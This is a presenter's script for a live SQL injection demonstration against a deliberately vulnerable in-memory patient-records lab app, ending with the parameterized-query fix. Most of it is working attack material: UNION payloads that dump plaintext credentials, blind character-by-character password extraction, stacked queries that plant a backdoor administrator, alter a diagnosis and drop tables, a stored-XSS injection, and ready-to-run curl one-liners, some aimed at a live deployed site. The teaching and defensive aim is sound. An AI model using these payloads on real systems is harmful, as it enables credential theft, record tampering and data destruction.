# SQL Injection — Step-by-Step + Live Demo Script

**Target:** MediCare Pro, `main` branch @ `495961f` (the vulnerable build)
**Attack surface:** `GET /api/sql?id=<payload>` — the Patient Record Lookup field
**Total runtime:** ~10–12 minutes
**Every payload below was executed against `main`'s exact `api/sql.js` and the outputs verified.**

> ⚠ **Do not commit this file.** `server.js:64` serves the repo root and the block
> list (`server.js:56`) does not cover `.md`. Committing this publishes your attack
> script on the live site. Keep it untracked.

---

## 0. Which build am I on? (read this first)

The vulnerability **only exists on `main` @ `495961f`**. Your working copy is
currently on `fix/sql-injection`, where every payload below returns 0 rows.

```
main                 fix/sql-injection
495961f  VULNERABLE  8a0f70d  FIXED   ← you are here
```

### Option A — demo the live Render deploy (zero setup)

Render auto-redeploys on push to `main`, so the live site is already the
vulnerable build. Verify before you walk on stage:

```bash
curl -G "https://YOUR-RENDER-URL/api/sql" --data-urlencode "id=1' OR '1'='1"
```

You want to see **5 patients**, not `"rowCount":0`. If you see 0 rows, Render is
serving the fixed branch and you need Option B.

### Option B — run the vulnerable build locally

```bash
git checkout main
npm start
# ... demo against http://localhost:3000 ...
git checkout fix/sql-injection
```

Your five `.md` docs are untracked, so they survive the branch switch untouched.

**Do not mix these up mid-demo.** If payloads suddenly return 0 rows, you are on
the wrong build — say "and here is the patch working" and turn it into the
closing beat instead of stalling.

---

## 1. Pre-flight checklist (3 minutes, before the audience arrives)

1. Confirm the vulnerable build is live (Option A curl above).
2. Load the page: **sidebar → Patient Records** (`/pages/sql-injection.html`).
3. Type `1` and press **Search Records**. You must see 1 row, Maria Santos.
4. Reset to a clean state: `curl -G "http://localhost:3000/api/sql" --data-urlencode "reset=1"`
5. Open a second browser tab on `http://localhost:3000/api/sql` so you can show
   raw JSON without leaving the page.
6. Have the fix ready to show: `api/sql.js` on `fix/sql-injection`, scrolled to
   the `QUERY` constant (line 21).
7. Screenshot each payload's output as a fallback in case the server dies.

---

## 2. Step-by-step: how the injection works

### The bug

`api/sql.js` on `main` pastes your field straight into the SQL text:

```js
// ❌ VULNERABLE
const query = `SELECT id, name, diagnosis FROM patients WHERE id = '${rawId}'`;
```

Your input lands **inside single quotes**. That is the whole vulnerability.

| You type | The server builds |
|---|---|
| `1` | `... WHERE id = '1'` |
| `1' OR '1'='1` | `... WHERE id = '1' OR '1'='1'` — your `'` closed the string |
| `0'; DROP TABLE patients;--` | `... WHERE id = '0';` **plus** `DROP TABLE patients` |

Three mechanics chain the rest:

- **`'`** — closes the string so the rest of your input becomes SQL.
- **`--`** — comments out the trailing quote the original query still expects.
- **`;`** — starts a new statement. The endpoint splits on `;` and executes each
  one, which is how **writes** work, not just reads.

The response's `executed` array proves the comment stripping and stacking:

```json
"executed": [
  "SELECT id, name, diagnosis FROM patients WHERE id = '0'",
  "INSERT INTO patients (id,name) VALUES (99,'Injected Patient')"
]
```

### The general recipe for any injection

1. **Find an input that reaches a query.** Here, the Patient ID field.
2. **Break the syntax** — append `'` and see whether the server errors or
   behaves differently. An error means your quote reached the SQL parser.
3. **Restore validity** — close the string, then fix the tail with `--` so the
   original trailing quote becomes a comment.
4. **Add a tautology** (`OR '1'='1`) to return everything.
5. **Escalate to a second table** with `UNION SELECT` — column count must match.
6. **Stack a second statement** with `;` to write.
7. **Obfuscate** with comments, casing, or `/**/` if a filter blocks keywords.

---

## 3. The payloads, step by step

Type these into the **Patient ID** box and click **Search Records**, or paste the
curl. Every output below is verified.

### Step 1 — Baseline (prove normal use works)

```
1
```
→ **1 row** — `1 | Maria Santos | Hypertension`

> Say: "Normal behaviour. One patient, looked up by ID. Everything from here on
> is this same field, same button."

### Step 2 — Break the syntax (the probe)

```
1'
```
→ **0 rows.** No error, but the query became `WHERE id = '1''` — unbalanced.

> Say: "Silent failure. That tells me the server didn't crash on my quote — it
> just parsed it as part of the SQL. Now let me make it do something visible."

### Step 3 — Tautology (dump the table)

```
1' OR '1'='1
```
→ **5 rows** — all patients, ignoring the ID entirely.

> Say: "I never guessed an ID. My quote closed the string, then `OR '1'='1` made
> the WHERE clause always true. Every row came back."

### Step 4 — Refine with ORDER BY / LIMIT

```
1' OR '1'='1' ORDER BY id DESC LIMIT 2--
```
→ **2 rows** — `5 Rosario Garcia`, then `4 Pedro Bautista`.

> Say: "Standard SQL clauses still work inside my injection. I can sort, page,
> and narrow — this is a full query interface now, not a broken field."

### Step 5 — UNION: steal another table

```
0' UNION SELECT username,password,role FROM users--
```
→ **4 rows of plaintext credentials:**

| username | password | role |
|---|---|---|
| admin | **admin123** | Administrator |
| doctor | password1 | Physician |
| nurse | nurse123 | Nurse |
| radiologist | xray2024 | Radiologist |

> Say: "I used `0` so the first query matches nothing, then `UNION SELECT` to
> append a completely different table. The hospital's password policy is
> 'password1', and none of these are hashed."

### Step 6 — The error oracle

```
0' UNION SELECT username,password FROM users--
```
→ **SQL error: `UNION queries have an incompatible number of columns: the first query has 3, this one has 2`**

> Say: "The server just told me the shape of its query. That error message is a
> free oracle — I can enumerate table structure without guessing."

### Step 7 — COUNT(*) — the blind probe

```
0' UNION SELECT COUNT(*),1,1 FROM patients--
```
→ **1 row** — `COUNT(*) = 5`

> Say: "Five patients. When a server returns no data at all, you still use this —
> you ask yes/no questions and read the count. That's blind SQL injection."

### Step 8 — ✍️ WRITE: insert a record

```
0'; INSERT INTO patients (id,name,diagnosis,ssn,notes) VALUES (99,'Injected Patient','SQLi Backdoor','000-00-0000','Written by injection');--
```
→ **1 row added**

Then search normally:
```
99
```
→ **1 row** — `99 | Injected Patient | SQLi Backdoor`

Confirm the count moved:
```
0' UNION SELECT COUNT(*),1,1 FROM patients--
```
→ **`COUNT(*) = 6`** (was 5)

> Say: "This is the escalation that matters. I didn't just read — I wrote. A
> record now exists that no legitimate staff member created."

### Step 9 — ✍️ WRITE: plant a backdoor administrator

```
0'; INSERT INTO users (username,password,role,email) VALUES ('backdoor','pwned123','Administrator','b@d.ph');--
```

Confirm it exists:
```
0' UNION SELECT username,password,role FROM users--
```
→ **5 rows** — the last one `backdoor | pwned123 | Administrator`

> Say: "I inserted a row into the credential table with the Administrator role.
> On a real database with a real login flow, that account signs in."

### Step 10 — ✍️ Tamper with an existing record

```
0'; UPDATE patients SET diagnosis='Severe Poisoning' WHERE id=1;--
```
→ **1 row modified**

Then search `1`:
→ `1 | Maria Santos | **Severe Poisoning**` (was Hypertension)

> Say: "Clinical data altered. In a hospital system this is not vandalism — it is
> a patient-safety issue. A doctor treating the wrong diagnosis can kill someone."

### Step 11 — ✍️ DELETE and destroy

```
0'; DELETE FROM patients WHERE id=99;--
```
→ **1 row removed** — `COUNT(*)` back to **5**

Then delete everything:
```
0'; DELETE FROM patients;--
```
→ **5 rows removed** — `COUNT(*) = 0`

Then the table itself:
```
0'; DROP TABLE patients;--
```
→ searching `1` now returns **`SQL error: Table "patients" does not exist`**

> Say: "No table, no app. And no backup policy in the world helps if the
> attacker had write access for a week before anyone noticed."

### Step 12 — Reset between steps

```
GET /api/sql?reset=1
```
or press the **Reset lab data** button on the page.

Restores the 5 seeded patients and the 4 users. A server restart does the same
thing, because the tables are in memory.

### Step 13 — Bonus: second-order SQLi → stored XSS

`renderResults()` writes cell values into `innerHTML` without escaping, so a
field can carry markup that fires on the *next* search:

```
0'; INSERT INTO patients (id,name,diagnosis) VALUES (100,'<img src=x onerror=alert(document.domain)>','injected');--
```

Then search `100`. The alert fires.

> Say: "The injection ran once, but the payload fires for **every** user who
> views that record afterwards. Persistence is what makes stored XSS dangerous —
> and SQL injection just gave me a write primitive to plant it."

---

## 4. Backup demo: blind SQL injection (still live on BOTH branches)

`/api/sql-blind` was never patched, so this works even on `fix/sql-injection`.
Use it if the main lab misbehaves, or as a second technique.

Page: `/pages/sql-blind.html` → returns only "Patient exists: Yes/No".

```
1' OR '1'='1--        → true
1' AND 1=1--          → true
1' AND 1=2--          → false     <- boolean oracle confirmed
```

Measure the password length:
```
1' AND LENGTH((SELECT password FROM users WHERE username='admin'))=8--   → true
1' AND LENGTH((SELECT password FROM users WHERE username='admin'))=7--   → false
```

Extract one character at a time — **all verified true:**
```
1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),2,1)='d'--
1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),3,1)='m'--
1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),4,1)='i'--
1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),5,1)='n'--
1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),6,1)='1'--
1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),7,1)='2'--
1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),8,1)='3'--
```
→ reveals **`admin123`** with no data ever leaving the server.

> ⚠ **Use the full form with `WHERE username='admin'`.** The short form
> `SUBSTRING(password,1,1)='z'` is gated on the payload containing the literal
> word `admin`. Without it, the check falls through to `parseInt("1' ...")` →
> `1` → `true`, so **wrong guesses return true** and the extraction looks like it
> works for every character. Verified: with the full form, all 8 positions return
> true for correct and false for wrong.

---

## 5. Live demo script (beat by beat)

Windows to have open: **browser** on the Patient Records page · **editor** on
`api/sql.js` (main branch) · **terminal** with the curl one-liners below.

### Beat 1 — The innocent lookup (0:00–0:45)

**Do:** type `1`, Search Records. One row appears.

**Say:**
> "This is the hospital's patient records page. I type an ID, it returns one
> patient. Behind the scenes the server takes this field and pastes it directly
> into a SQL query. Watch what that costs them."

### Beat 2 — Break the string (0:45–1:30)

**Do:** type `1'`. Search. Empty.

**Say:**
> "Nothing came back — but nothing *broke* either. My quote reached the SQL
> parser and just unbalanced the query. That's the tell. Now I close the string
> myself and add a condition that's always true."

### Beat 3 — Dump the table (1:30–2:15)

**Do:** `1' OR '1'='1`. Search. Five patients.

**Say:**
> "I never guessed an ID. Every patient record the hospital has is on screen.
> One field, one quote, one OR."

### Beat 4 — Cross into another table (2:15–3:15)

**Do:** `0' UNION SELECT username,password,role FROM users--`. Search.

**Say:**
> "This is the part that should worry you. I didn't touch the patients table — I
> *appended* a second query against the users table. Here are four staff
> accounts with plaintext passwords, including the administrator. I am now the
> hospital."

### Beat 5 — The server helps me (3:15–3:45)

**Do:** `0' UNION SELECT username,password FROM users--`. Search.

**Say:**
> "And when I get the shape wrong, the server *tells me the correct shape*.
> That error message is an oracle. This is why you never return raw driver
> errors to a client."

### Beat 6 — From reading to writing (3:45–5:00)

**Do:** the INSERT payload with id 99. Search. Then search `99`. Then COUNT(*).

**Say:**
> "Reading is bad. Writing is worse. I just added a patient that no staff member
> created, and the count went from five to six. This is no longer an
> information leak — it's a data-integrity breach."

### Beat 7 — Plant an admin (5:00–5:45)

**Do:** the backdoor INSERT. Then the UNION dump showing five users.

**Say:**
> "A new row in the credential table, role Administrator. On a real database
> with a real login flow, that account signs in and it looks completely
> legitimate — it was created by the application itself."

### Beat 8 — Corrupt a diagnosis (5:45–6:30)

**Do:** the UPDATE payload. Then search `1`.

**Say:**
> "Maria Santos was hypertensive. Now her chart says 'Severe Poisoning.' In a
> hospital, changing a diagnosis isn't defacement — a clinician acting on that
> record could harm a patient. SQL injection here is a patient-safety bug."

### Beat 9 — Delete everything (6:30–7:15)

**Do:** `DELETE ... WHERE id=99`, then `DELETE FROM patients`, then DROP TABLE.
Search `1` → "Table does not exist."

**Say:**
> "And when you're done with a system, you can remove it. No table, no
> application. Recovery from this is a restore-from-backup conversation, and it
> only works if the attacker didn't get there first."

### Beat 10 — The fix (7:15–8:45)

**Do:** switch the editor to `fix/sql-injection`'s `api/sql.js`. Show the constant:

```js
const QUERY = 'SELECT id, patientId, name, diagnosis, department FROM patients WHERE id = ?';
```

**Say:**
> "The fix is one line. The query is a constant and the value is **bound as a
> parameter**. The driver sends the SQL text and the value separately, so my
> quote arrives as a literal character and matches nothing. There's no longer a
> users table to select from, no write path at all, and the page now reads
> Firestore directly instead of trusting a server-side string.
>
> Supporting measures: least-privilege database user, stored procedures, no
> stacked queries in the driver, no raw errors, and auth on every endpoint —
> because this one has none at all."

### Beat 11 — Close (8:45–9:15)

**Say:**
> "One unquoted field took me from reading a patient record to planting an
> administrator and dropping the table. Parameterize every query, everywhere,
> by default. Questions?"

---

## 6. Curl one-liners (Windows `cmd.exe`, all verified)

`-G --data-urlencode` encodes the payload for you, so there are no `%20`
sequences for `cmd.exe` to mangle. The double quotes keep `'`, `<`, `>` literal.

```bash
:: 1 - baseline
curl -G "http://localhost:3000/api/sql" --data-urlencode "id=1"

:: 2 - tautology
curl -G "http://localhost:3000/api/sql" --data-urlencode "id=1' OR '1'='1"

:: 3 - order + limit
curl -G "http://localhost:3000/api/sql" --data-urlencode "id=1' OR '1'='1' ORDER BY id DESC LIMIT 2--"

:: 4 - steal credentials
curl -G "http://localhost:3000/api/sql" --data-urlencode "id=0' UNION SELECT username,password,role FROM users--"

:: 5 - error oracle
curl -G "http://localhost:3000/api/sql" --data-urlencode "id=0' UNION SELECT username,password FROM users--"

:: 6 - count
curl -G "http://localhost:3000/api/sql" --data-urlencode "id=0' UNION SELECT COUNT(*),1,1 FROM patients--"

:: 7 - insert a patient
curl -G "http://localhost:3000/api/sql" --data-urlencode "id=0'; INSERT INTO patients (id,name,diagnosis,ssn,notes) VALUES (99,'Injected Patient','SQLi Backdoor','000-00-0000','Written by injection');--"

:: 8 - read it back
curl -G "http://localhost:3000/api/sql" --data-urlencode "id=99"

:: 9 - plant a backdoor admin
curl -G "http://localhost:3000/api/sql" --data-urlencode "id=0'; INSERT INTO users (username,password,role,email) VALUES ('backdoor','pwned123','Administrator','b@d.ph');--"

:: 10 - tamper with a diagnosis
curl -G "http://localhost:3000/api/sql" --data-urlencode "id=0'; UPDATE patients SET diagnosis='Severe Poisoning' WHERE id=1;--"

:: 11 - delete one
curl -G "http://localhost:3000/api/sql" --data-urlencode "id=0'; DELETE FROM patients WHERE id=99;--"

:: 12 - delete everything
curl -G "http://localhost:3000/api/sql" --data-urlencode "id=0'; DELETE FROM patients;--"

:: 13 - drop the table
curl -G "http://localhost:3000/api/sql" --data-urlencode "id=0'; DROP TABLE patients;--"

:: 14 - second-order XSS
curl -G "http://localhost:3000/api/sql" --data-urlencode "id=0'; INSERT INTO patients (id,name,diagnosis) VALUES (100,'<img src=x onerror=alert(document.domain)>','injected');--"

:: 15 - reset the lab
curl -G "http://localhost:3000/api/sql" --data-urlencode "reset=1"
```

Replace `http://localhost:3000` with your Render URL to run against the live site.

---

## 7. What to actually claim (honesty checklist)

Be precise. An informed audience will check.

**True:**
- The injection is real. `main`'s `api/sql.js` concatenates input into SQL and
  genuinely parses and executes the result.
- Rows really are inserted, modified, and deleted, and persist across requests.
- The credential dump is real — `users.password` really is plaintext.
- The error oracle is real.
- On **any real database**, this exact payload writes rows that survive restarts,
  are visible to every user, and plant an account that logs in.

**Not true — do not claim it:**
- These are **not hospital records**. There is no database in this project.
  `package.json` has no SQL driver — only `dotenv`, `express`, `firebase-admin`.
  `DB` is a plain JavaScript object in process memory, wiped on restart and on
  every Render redeploy.
- It does **not** touch Firestore. The app's real patient data is unaffected.
- The `backdoor` user **cannot sign in**. It is a row in a lab table, not a
  Firebase session.

**The honest framing:**
> "This is a simulated engine, but the attack logic is the real thing. Against an
> actual database, step 9 plants an account that logs in and step 11 destroys the
> table. I'm demonstrating the technique, not hacking a hospital."

**Note for the record:** `fix/sql-injection` closes all of this — verified by
`tests/sql.test.js` (8 tests). It is not merged to `main` yet.

---

## 8. Recovery during a demo

| Problem | Fix |
|---|---|
| Payloads return 0 rows | You're on the fixed build. Switch to `main`, or make it the closing beat. |
| Table dropped by accident | `GET /api/sql?reset=1`, or restart the server. |
| Wrote junk rows | `reset=1` restores 5 patients / 4 users. |
| Server died | `npm start` again — in-memory data resets to seed. |
| Render is serving the fix | Demo locally with Option B instead. |
| Browser tab lost | All payloads work as raw curl (section 6). |
